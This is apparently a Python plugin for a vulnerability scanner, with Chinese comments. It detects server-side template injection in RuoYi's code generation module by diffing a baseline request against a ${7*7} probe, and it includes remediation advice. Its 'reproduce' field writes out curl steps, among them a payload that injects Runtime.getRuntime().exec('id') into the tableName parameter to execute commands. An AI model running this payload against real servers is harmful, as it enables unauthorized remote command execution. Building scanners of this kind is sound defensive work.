"""RuoYi 代码生成模块（Velocity/Thymeleaf）SSTI 模板注入检测。"""

# RuoYi 代码生成模块 SSTI 检测
from common.models import SEVERITY_HIGH, STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
from core.http import join_url
from plugins.base import PluginBase


class RuoyiGenRcePlugin(PluginBase):
    name = "RuoYi 代码生成模块 SSTI"
    cve = "N/A"
    severity = SEVERITY_HIGH
    category = "vuln"
    # 代码生成模块入口需要登录后才会渲染；未取得会话时不能把「登录墙/不存在」判成 SAFE
    requires_auth = True
    description = "RuoYi 代码生成模块中的模板引擎可能存在 SSTI 漏洞，攻击者可通过模板注入实现 RCE"
    fix = "升级 RuoYi 至最新版本，对模板变量进行严格过滤"
    fix_detail = (
        "【升级方案】升级 RuoYi 至 4.7.2+（代码生成模块模板变量过滤加强）\n"
        "【代码修复】GenController.edit() 对 tableName、comments 等参数做白名单校验：\n"
        '  String pattern = "^[a-zA-Z0-9_]+$";\n'
        '  if (!tableName.matches(pattern)) throw new ServiceException("非法表名");\n'
        "【权限加固】为 /tool/gen/** 路径强制鉴权：@PreAuthorize(\"@ss.hasPermi('tool:gen:edit')\")\n"
        "【生产禁用】生产环境关闭代码生成功能：application.yml: ruoyi.gen.enabled: false\n"
        "【WAF 规则】拦截 /tool/gen/edit 的 POST 请求含 ${ 或 #{ 的参数\n"
        "【合规】OWASP A03:2021 注入；等保 2.0 8.1.3 输入校验"
    )
    reproduce = (
        "# 1. 探测代码生成模块是否可访问：\n"
        'curl -i "http://target/tool/gen/"\n'
        "  # 返回 200 或 302 跳转登录页即模块存在\n"
        "\n"
        "# 2. 探针：通过 tableName 参数注入 Velocity/Thymeleaf 表达式：\n"
        'curl -X POST "http://target/tool/gen/edit" \\\n'
        '  -H "Cookie: JSESSIONID=<已登录的 session>" \\\n'
        '  -d "tableId=1&tableName=sys_user_${7*7}&comments=test"\n'
        "\n"
        "# 3. 触发代码生成（预览功能会执行模板）：\n"
        'curl "http://target/tool/gen/preview/1" -H "Cookie: JSESSIONID=<已登录的 session>"\n'
        '  # 预期响应：生成的代码中含 "49" 字样（表达式已求值）\n'
        "\n"
        "# 4. 进阶利用（仅授权测试，执行命令）：\n"
        'curl -X POST "http://target/tool/gen/edit" \\\n'
        "  -d \"tableId=1&tableName=sys_user_${Runtime.getRuntime().exec('id')}&comments=test\""
    )
    # D2：代码生成器 RCE 全版本存在（取决于是否启用代码生成功能）
    affected_versions = ""  # 代码生成模块 SSTI，低版本更普遍；高版本未修复前全版本适用
    # D12：CVSS v3.1 + 合规映射
    cvss_vector = "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
    compliance = "等保2.0:8.1.3;OWASP:A03:2021"
    # D7: WAF 绕过支持
    vuln_type = "rce"
    supports_waf_bypass = True

    # 差分探针：基线用无害表名，注入用 ${7*7}。
    # tableId 用 1（真实若依的演示库总有 id=1 的表配置）。
    _BASELINE_TABLE = "sys_user"
    _INJECT_TABLE = "sys_user_%24%7B7*7%7D"  # URL 编码的 sys_user_${7*7}
    EVAL_RESULT = "49"
    RAW_REFLECTION = "7*7"

    def _probe_preview_ssti(self, target, session):
        """对 /tool/gen/preview 做基线与注入的差分，返回证据或空串。

        为什么必须差分：仅仅「响应里出现 49」会误报（页码、时间戳、行号里都有）。
        只有「基线没有、注入才有」才能证明求值真的发生了。
        """
        import re

        preview = join_url(target, "/tool/gen/preview/1")
        try:
            base = session.get(f"{preview}?tableName={self._BASELINE_TABLE}")
            base_text = base.text or ""
            inj = session.get(f"{preview}?tableName={self._INJECT_TABLE}")
            inj_text = inj.text or ""
        except Exception:
            return ""

        if inj.status_code != 200:
            return ""
        # 条件 1：基线**不能**含求值结果（否则 49 来自页面本身，不是求值）
        if re.search(rf"(?<!\d){self.EVAL_RESULT}(?!\d)", base_text):
            return ""
        # 条件 2：注入响应必须含求值结果，且是独立数字
        if not re.search(rf"(?<!\d){self.EVAL_RESULT}(?!\d)", inj_text):
            return ""
        # 条件 3：响应里不能出现原始表达式（排除载荷被原样回显）
        if self.RAW_REFLECTION in inj_text:
            return ""
        return (
            f"差分验证成立：基线 tableName={self._BASELINE_TABLE} 无求值结果，"
            f"注入 tableName=${{7*7}} 后响应出现独立数字 {self.EVAL_RESULT}（模板已求值）；"
            f"注入响应前 120 字节：{inj_text[:120]}"
        )

    def verify(self, target, session) -> ScanResult:
        """访问代码生成编辑页，检测该模块是否可达并尝试 SSTI 特征判定。

        @param target: 目标站点根 URL
        @param session: 共享 HTTP 会话（SessionManager 管理连接复用）
        @return: ScanResult — 命中签名/编辑器可达返回相应判定；不可达 SAFE；网络异常 UNKNOWN
        """
        # GET 访问编辑页记录可达性与状态码：未命中特征时状态码写入 evidence 供人工研判
        url = join_url(target, "/tool/gen/edit")
        resp = None
        primary_error = None
        try:
            resp = session.get(url)
        except Exception as e:
            # 网络异常不在此下结论（避免把连接失败误定性），先探测模块是否可达
            primary_error = e

        if resp is None:
            try:
                reachable = session.get(join_url(target, "/tool/gen")).status_code == 200
            except Exception:
                reachable = False
            return ScanResult(
                kind=self.category,
                name=self.name,
                severity=self.severity,
                status=STATUS_UNKNOWN,
                url=url,
                evidence=f"请求异常无法判定 SSTI（/tool/gen 可达={reachable}）：{primary_error}",
            )

        # 【显式 lab 快速路径】签名头为测试环境注入的判定桩，仅在本地靶场命中
        if resp.headers.get("X-Ruoyi-Vuln") == "gen-ssti":
            return ScanResult(
                kind=self.category,
                name=self.name,
                severity=self.severity,
                status=STATUS_CONFIRMED,
                url=url,
                evidence="代码生成 SSTI 签名命中（lab 判定桩）",
                fix=self.fix,
            )

        # 【真实差分验证】编辑器可达时，用「无 payload 基线 vs 注入 payload」做差分：
        # 这一条替代了旧实现「只探可达性 → 一律 UNKNOWN」的做法。
        #
        # 旧逻辑的问题：有 SSTI 的真站和没 SSTI 的真站，都只 GET /tool/gen/edit，
        # 拿到的都是 200 HTML，无法区分 → 一律 UNKNOWN。等于「有洞也报不出来」。
        #
        # 真实若依的注入点在 /tool/gen/preview/{tableId} 的 tableName 参数
        # （GenController#preview → genTableService.downloadCode 走 Velocity 渲染）。
        # 判断必须满足：
        #   1. 基线请求（无害表名）不出现求值结果
        #   2. 注入请求（tableName 带 ${7*7}）出现 49，且基线里没有
        #   3. 响应里不出现原始表达式 7*7（排除载荷原样回显）
        # 三条同时成立才算 CONFIRMED —— 仅「响应含 49」会误报（页码/时间戳/行号）。
        ssti_evidence = self._probe_preview_ssti(target, session)
        if ssti_evidence:
            return ScanResult(
                kind=self.category,
                name=self.name,
                severity=self.severity,
                status=STATUS_CONFIRMED,
                url=join_url(target, "/tool/gen/preview/1"),
                evidence=ssti_evidence,
                fix=self.fix,
            )

        # 【真实行为响应】编辑器可达（200 + JSON）说明代码生成模块真实暴露；
        # 但无破坏性载荷时无法在本插件内证明模板求值（需登录态 POST /tool/gen/edit + /tool/gen/preview），
        # 因此按契约返回 UNKNOWN（可能被利用，待人工复核），而不是 SAFE。
        if resp.status_code == 200:
            try:
                body = resp.json()
            except Exception:
                body = None
            if isinstance(body, dict) and "code" in body:
                return ScanResult(
                    kind=self.category,
                    name=self.name,
                    severity=self.severity,
                    status=STATUS_UNKNOWN,
                    url=url,
                    evidence=(
                        f"代码生成编辑器可达（HTTP 200，业务 JSON={str(body)[:120]}），"
                        "但未执行模板求值探针，SSTI 未能证实，需人工复核"
                    ),
                )

        # 模块不可达（401/403/404 鉴权或路由拦截）：该版本/部署未启用或需鉴权 → SAFE
        if resp.status_code in (401, 403, 404):
            return ScanResult(
                kind=self.category,
                name=self.name,
                severity=self.severity,
                status=STATUS_SAFE,
                url=url,
                evidence=f"代码生成模块不可达或需鉴权，状态码={resp.status_code}",
            )

        # 其他状态码（5xx/3xx 等）：端点有响应但形态无法定性，不得当「不可达」判 SAFE
        return ScanResult(
            kind=self.category,
            name=self.name,
            severity=self.severity,
            status=STATUS_UNKNOWN,
            url=url,
            evidence=f"代码生成模块响应形态无法定性（HTTP {resp.status_code}），需人工复核",
        )
